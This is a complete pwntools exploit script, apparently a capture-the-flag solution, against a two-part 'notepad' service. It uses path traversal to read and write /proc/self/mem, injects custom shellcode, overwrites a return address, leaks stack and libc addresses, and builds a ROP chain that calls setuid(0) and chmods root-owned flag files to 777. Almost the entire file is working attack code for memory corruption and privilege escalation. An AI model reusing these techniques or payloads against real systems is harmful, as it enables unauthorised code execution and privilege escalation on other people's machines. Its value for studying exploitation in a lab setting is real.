#!/usr/bin/env python3

from pwn import *
from notepad import *

context.arch = "amd64"

# Frontend Info
FRONTEND_CONNECT_BACKEND_ADDR = 0x14D7
FRONTEND_EDIT_NOTE_RET_ADDR = 0x2390
FRONTEND_SHOW_NOTE_RET_ADDR = 0x244D

FRONTEND_FINI_OFFSET = 0x2471
FRONTEND_DATA_OFFSET = 0x5000

FRONTEND_MAP_PATH = b"././././././././././././././././././././././././././././././././././././././././././../../../proc/self/maps"
FRONTEND_MEM_PATH = b"./././././././././././././././././././././././././../../../home/notepad/../../././././././././proc/self/mem"

FRONTEND_MAX_STACK_OFFSET = 0x10000

# Backend Info
BACKEND_GET_FLAG_ADDR = 0x1DC7

BACKEND1_GOTT_OFFSET = 0x4F08
BACKEND1_GOT_MKDIR_OFFSET = 0x4F28
"""
0x0 0x0
0x0 0x0
strcpy mkdir
write htons
...
"""

BACKEND1_MAIN_STACK_SIZE = 0x40
BACKEND1_CONNECT_HANDLER_STACK_SIZE = 0x1E0
BACKEND1_GET_FOLDER_STACK_SIZE = 0x130
BACKEND1_GET_FLAG_STACK_SIZE = 0x20

BACKEND1_CONNECT_HANDLER_COMMAND_OFFSET = 0x1C0

# SessionNode
COMMAND_HEADER_LENGTH = 0x8 + 0x8
COMMAND_TOKEN_LENGTH = 0x20

# UserNode
USER_HEADER_LENGTH = 0x10 + 0x10

# Libc Info
LIBC_MKDIR_OFFSET = 0x114640

LIBC_SO_PATH = b"././././././././././././././././././././././../../../home/notepad/../..//usr/lib/x86_64-linux-gnu/libc.so.6"
LD_SO_PATH = b"././././././././././././././././././././././././././../../..//usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2"

# Get token
USERNAME = b"hacker"
PASSWORD = b"jhc"


def show_file(r, filename):
    file = b""
    while True:
        sub_file = show_note(r, filename, len(file))
        if b"Read note failed.\n" in sub_file:
            break
        file += sub_file
    return file


def write_file_carefully(r, local_filename, remote_filename):
    # Load the length of local file
    with open(local_filename, "rb") as f:
        offset = len(f.read())

    while True:
        sub_file = show_note(r, remote_filename, offset)
        if b"Read note failed.\n" in sub_file:
            break

        # Write to local file
        with open(local_filename, "ab") as f:
            f.write(sub_file)

        offset += len(sub_file)


def get_elf_base_addr(map, elf_name):
    elf_base_addr = 0
    for line in map.split(b"\n"):
        if elf_name in line:
            elf_base_addr = int(line.split(b"-")[0], 16)
            break
    return elf_base_addr


def get_stack_high_addr(map):
    stack_high_addr = 0
    for line in map.split(b"\n"):
        if b"[stack]" in line:
            stack_high_addr = int(line.split(b"-")[1].split(b" ")[0], 16)
            break
    return stack_high_addr


def find_ret_addr_on_stack(r, stack_high_addr, ret_addr, mem_path):
    for i in range(0x0000, FRONTEND_MAX_STACK_OFFSET, MAX_NOTE_LENGTH):
        addr = stack_high_addr - i
        msg = show_note(
            r,
            mem_path,
            addr,
        )
        if ret_addr.to_bytes(8, "little") in msg:
            addr = addr + msg.index(ret_addr.to_bytes(8, "little"))
            return addr
    return 0


def get_shellcode(elf_base_addr, shellcode_addr):
    # Example usage:
    #    b"\x69\x00\x00\x00" + b"/flag_root\x00"

    # while True:
    #   read(0, elf_base_addr + FRONTEND_DATA_OFFSET, COMMAND_LENGTH + 1)
    #   if byte at elf_base_addr + FRONTEND_DATA_OFFSET is 0x69:
    #     int fd = open(elf_base_addr + FRONTEND_DATA_OFFSET + 0x4, 0, 0)
    #     read(fd, elf_base_addr + FRONTEND_DATA_OFFSET, RESPONSE_LENGTH)
    #     write(1, elf_base_addr + FRONTEND_DATA_OFFSET, RESPONSE_LENGTH)
    #   else:
    #     int fd = connect_backend()
    #     write(fd, elf_base_addr + FRONTEND_DATA_OFFSET, COMMAND_LENGTH)
    #     read(fd, elf_base_addr + FRONTEND_DATA_OFFSET, RESPONSE_LENGTH)
    #     write(1, elf_base_addr + FRONTEND_DATA_OFFSET, RESPONSE_LENGTH)

    assmebly = f"""
    mov rax, 0x0
    mov rdi, 0x0
    mov rsi, {elf_base_addr + FRONTEND_DATA_OFFSET}
    mov rdx, {COMMAND_LENGTH + 1}
    syscall

    mov rax, {elf_base_addr + FRONTEND_DATA_OFFSET}
    mov al, byte ptr [rax]
    cmp al, 0x69
    je read_flag

    mov rax, {elf_base_addr + FRONTEND_CONNECT_BACKEND_ADDR}
    call rax
    mov rdi, rax

    mov rax, 0x1
    mov rsi, {elf_base_addr + FRONTEND_DATA_OFFSET}
    mov rdx, {COMMAND_LENGTH}
    syscall

    mov rax, 0x0
    mov rdx, {RESPONSE_LENGTH}
    syscall

    mov rax, 0x1
    mov rdi, 0x1
    syscall

    mov rsi, {shellcode_addr}
    push rsi
    ret

    read_flag:

    mov rax, 0x2
    mov rdi, {elf_base_addr + FRONTEND_DATA_OFFSET + 4}
    mov rsi, 0x0
    mov rdx, 0x0
    syscall

    mov rdi, rax
    mov rax, 0x0
    mov rsi, {elf_base_addr + FRONTEND_DATA_OFFSET}
    mov rdx, {RESPONSE_LENGTH}
    syscall

    mov rax, 0x1
    mov rdi, 0x1
    syscall

    mov rsi, {shellcode_addr}
    push rsi
    ret

    """

    shellcode = asm(assmebly)
    return shellcode


def parse_shellcode(shellcode):
    parsed_shellcode = []  # list of (number of \x00, sub_shellcode)
    i = 0
    zero_length = 0
    sub_shellcode = b""

    shellcode += b"\x00"  # append \x00 to the end of shellcode to make sure the last sub_shellcode is appended to parsed_shellcode

    while i < len(shellcode):
        if shellcode[i] == 0x00 or len(sub_shellcode) >= MAX_CONTENT_LENGTH:
            parsed_shellcode.append((zero_length, sub_shellcode))

            zero_length = 0
            while i < len(shellcode) and shellcode[i] == 0x00:
                i += 1
                zero_length += 1

            sub_shellcode = b""
        else:
            sub_shellcode += bytes([shellcode[i]])
            i += 1

    return parsed_shellcode


def write_parsed_shellcode(r, addr, parsed_shellcode, mem_path):
    for zero_length, sub_shellcode in parsed_shellcode:
        addr += zero_length
        edit_note(
            r,
            mem_path,
            addr,
            len(sub_shellcode),
            sub_shellcode,
        )
        addr += len(sub_shellcode)


def get_frontend_info(r):
    frontend_maps = show_file(r, FRONTEND_MAP_PATH)

    # Parse self maps to get stack high address
    frontend_stack_high_addr = get_stack_high_addr(frontend_maps)

    # Parse self maps to get elf base address
    frontend_elf_base_addr = get_elf_base_addr(frontend_maps, b"notepad")

    # Get return address of edit_note
    frontend_return_addr = frontend_elf_base_addr + FRONTEND_SHOW_NOTE_RET_ADDR
    print("frontend_return_addr: ", hex(frontend_return_addr))

    # Get return address of edit_note on stack
    frontend_return_addr_stack = find_ret_addr_on_stack(
        r, frontend_stack_high_addr, frontend_return_addr, FRONTEND_MEM_PATH
    )
    print("frontend_return_addr_stack: ", hex(frontend_return_addr_stack))

    # Get address to put shellcode
    frontend_shellcode_addr = frontend_elf_base_addr + FRONTEND_FINI_OFFSET

    return (
        frontend_elf_base_addr,
        frontend_return_addr_stack,
        frontend_shellcode_addr,
    )


def get_frontend_ready(r):
    username = USERNAME
    password = PASSWORD

    register(r, username, password)
    login(r, username, password)

    # Can do something here
    write_file_carefully(r, b"test", FRONTEND_MAP_PATH)
    write_file_carefully(r, b"so/libc.so.6", LIBC_SO_PATH)
    write_file_carefully(r, b"so/ld-linux-x86-64.so.2", LD_SO_PATH)

    (
        frontend_elf_base_addr,
        frontend_return_addr_stack,
        frontend_shellcode_addr,
    ) = get_frontend_info(r)

    # Construct shellcode
    shellcode = get_shellcode(frontend_elf_base_addr, frontend_shellcode_addr)

    # Parse shellcode and write to memory
    parsed_shellcode = parse_shellcode(shellcode)
    write_parsed_shellcode(
        r, frontend_shellcode_addr, parsed_shellcode, FRONTEND_MEM_PATH
    )

    # Edit note to jump to shellcode
    reply(r, b"> ", b"4")
    reply(r, b"Note Name: ", FRONTEND_MEM_PATH)
    reply(r, b"Offset: ", bytes(str(frontend_return_addr_stack), "utf-8"))
    reply(r, b"Content Length: ", bytes(str(9), "utf-8"))
    reply(r, b"Content: ", frontend_shellcode_addr.to_bytes(8, "little"))

    r.recvline()


def send_payload(r, payload):
    payload += b"\x00" * (COMMAND_LENGTH - len(payload))
    r.send(payload)
    return r.recv(RESPONSE_LENGTH)


def get_token(r):
    # Login
    payload = b"\x02\x00\x00\x00"
    payload += USERNAME + b"\x00"
    payload += PASSWORD + b"\x00"

    token = send_payload(r, payload)
    token += b"\x00" * 4  # pad to 264 bytes

    return token


def register_an_account(r):
    # Register (For further usage)
    username = USERNAME
    password = PASSWORD

    payload = b"\x01\x00\x00\x00"
    payload += username + b"\x00"
    payload += password + b"\x00"

    send_payload(r, payload)

    # Login (Leak stack)
    return get_token(r)


def leak_info_by_get_flag(r):
    # Get Flag (Leak stack)
    payload = b"\x87\x87"
    flag = send_payload(r, payload)
    # print("flag: ", flag)

    token = get_token(r)

    info = [token[i : i + 8] for i in range(0, len(token), 8)]

    for i in range(len(info)):
        print(i, hex(u64(info[i])))

    # The following are leaked in stack

    rbp_related_info = u64(info[-5])
    get_flag_plus_76_addr = u64(info[-4])

    # ELF base
    elf_base = get_flag_plus_76_addr - BACKEND_GET_FLAG_ADDR - 76
    # print("elf_base: ", hex(elf_base))

    # Stack rbp
    main_rbp = rbp_related_info - 0x118
    # print("main_rbp: ", hex(main_rbp))

    connect_handler_rbp = main_rbp - BACKEND1_MAIN_STACK_SIZE - 0x10
    get_folder_rbp = connect_handler_rbp - BACKEND1_CONNECT_HANDLER_STACK_SIZE - 0x10
    check_token_rbp = get_folder_rbp - BACKEND1_GET_FOLDER_STACK_SIZE - 0x10

    # print("connect_handler_rbp: ", hex(connect_handler_rbp))

    return elf_base, check_token_rbp, connect_handler_rbp


def write_127_bytes(r, addr, content, known_token=None):
    """
    Condition:
        1. Content in addr shoule be known (until the null terminator)
        2. There is no null terminator in content
        3. Content should not be greater than 127 bytes
    Result:
        1. Write 127 bytes to addr
    """

    token = get_token(r).strip(b"\x00")[:32]

    # Get Folder
    payload = b"\x11\x00\x00\x00"
    payload += token + b"\x00" * (COMMAND_TOKEN_LENGTH - len(token))
    payload += b"A" * 33 + p64(addr - COMMAND_HEADER_LENGTH)

    msg = send_payload(r, payload)
    # print("Get Folder 1 msg: ", msg)

    # Get Folder
    if known_token is None:
        known_token = b"\x00" * 32

    payload = b"\x11\x00\x00\x00"  # 4 bytes
    payload += known_token + b"\x00" * (
        COMMAND_TOKEN_LENGTH - len(known_token)
    )  # 32 bytes
    payload += b"A" + content  # 1 byte

    msg = send_payload(r, payload)
    # print("Get Folder 2 msg: ", msg)


def read_127_bytes(r, addr, connect_handler_rbp):
    token = get_token(r).strip(b"\x00")[:32]

    # Get Folder
    payload = b"\x11\x00\x00\x00"
    payload += token + b"\x00" * (COMMAND_TOKEN_LENGTH - len(token))
    payload += b"A" * 33 + p64(
        connect_handler_rbp - BACKEND1_CONNECT_HANDLER_COMMAND_OFFSET + 0x30
    )

    msg = send_payload(r, payload)
    # print("Get Folder 1 msg: ", msg)

    # Get Folder (effective payload has 0x30 bytes)
    payload = b"\x11\x00\x00\x00"  # 4 bytes
    payload += b"Q" * 31 + b"\x00"  # 32 bytes
    payload += b"A\x00" + b"\x00" * (12 - 2)  # 12 bytes

    # Fake session
    payload += p64(addr - USER_HEADER_LENGTH) + p64(0)
    payload += b"Q" * 31 + b"\x00"

    msg = send_payload(r, payload)
    # print("Get Folder 2 msg: ", msg)

    msg = msg[4:]

    return msg


def notepad(port):
    r = remote(SERVER_IP, port)
    # r = process("./share/notepad")

    get_frontend_ready(r)

    register_an_account(r)
    (elf_base, check_token_rbp, connect_handler_rbp) = leak_info_by_get_flag(r)

    print("elf_base: ", hex(elf_base))
    print("check_token_rbp: ", hex(check_token_rbp))
    print("connect_handler_rbp: ", hex(connect_handler_rbp))

    libc_mkdir_addr = read_127_bytes(
        r, elf_base + BACKEND1_GOT_MKDIR_OFFSET, connect_handler_rbp
    )
    libc_base = u64(libc_mkdir_addr[:8]) - LIBC_MKDIR_OFFSET

    print("libc_mkdir_addr: ", hex(u64(libc_mkdir_addr[:8])))
    print("libc_base: ", hex(libc_base))

    libc_pop_rsp_add_rsp_0x18_pop_rbx_pop_rbp_ret = libc_base + 0x00000000000507CB
    libc_pop_rdi_ret = libc_base + 0x000000000002A3E5
    libc_pop_rsi_ret = libc_base + 0x000000000002BE51
    libc_setuid = libc_base + 0xEC0D0
    libc_chmod = libc_base + 0x114440

    # Construct ROP Chain
    rop_chain = b""

    # setuid(0), 3 gadgets
    rop_chain += p64(libc_pop_rdi_ret)
    rop_chain += p64(0)
    rop_chain += p64(libc_setuid)

    # chmod("/flag_root", 777), 5 gadgets
    rop_chain += p64(libc_pop_rdi_ret)
    rop_chain += p64(
        connect_handler_rbp - BACKEND1_CONNECT_HANDLER_COMMAND_OFFSET + 132
    )  # 37 + 7 + len(rop_chain)
    rop_chain += p64(libc_pop_rsi_ret)
    rop_chain += p64(511)
    rop_chain += p64(libc_chmod)

    # chmod("/flag_backend", 777), 3 gadgets
    rop_chain += p64(libc_pop_rdi_ret)
    rop_chain += p64(
        connect_handler_rbp - BACKEND1_CONNECT_HANDLER_COMMAND_OFFSET + 132 + 11
    )  # 37 + 7 + len(rop_chain) + 11
    rop_chain += p64(libc_chmod)

    # Can use at most 12 gadgets
    payload = (
        p64(libc_pop_rsp_add_rsp_0x18_pop_rbx_pop_rbp_ret)[:7]  # 7 bytes
        + rop_chain  # 88 bytes
        + b"/flag_root\x00"  # 11 bytes
        + b"/flag_backend"  # 13 bytes
    )

    write_127_bytes(
        r,
        check_token_rbp + 0x8,  # return address of check_token
        payload,
        p64(elf_base + 0x1AEC),  # original return address
    )

    # This payload is designed for the shellcode

    payload = b"\x69\x00\x00\x00"
    payload += b"/flag_user\x00"

    flag_user = send_payload(r, payload).strip(b"\x00")
    print("flag_user: ", flag_user)

    payload = b"\x69\x00\x00\x00"
    payload += b"/flag_backend\x00"

    flag_backend = send_payload(r, payload).strip(b"\x00")
    print("flag_backend: ", flag_backend)

    payload = b"\x69\x00\x00\x00"
    payload += b"/flag_root\x00"

    flag_root = send_payload(r, payload).strip(b"\x00")
    print("flag_root: ", flag_root)

    r.interactive()


def main():
    # Load from file 'port.txt'
    with open("port.txt", "r") as f:
        port = int(f.read())

    # try to connect, if error occurs, get new port
    try:
        notepad(port)
    except Exception as e:
        print(e)

        port = get_service_port()

        # Write new port to file 'port.txt'
        with open("port.txt", "w") as f:
            f.write(str(port))

        notepad(port)


if __name__ == "__main__":
    main()
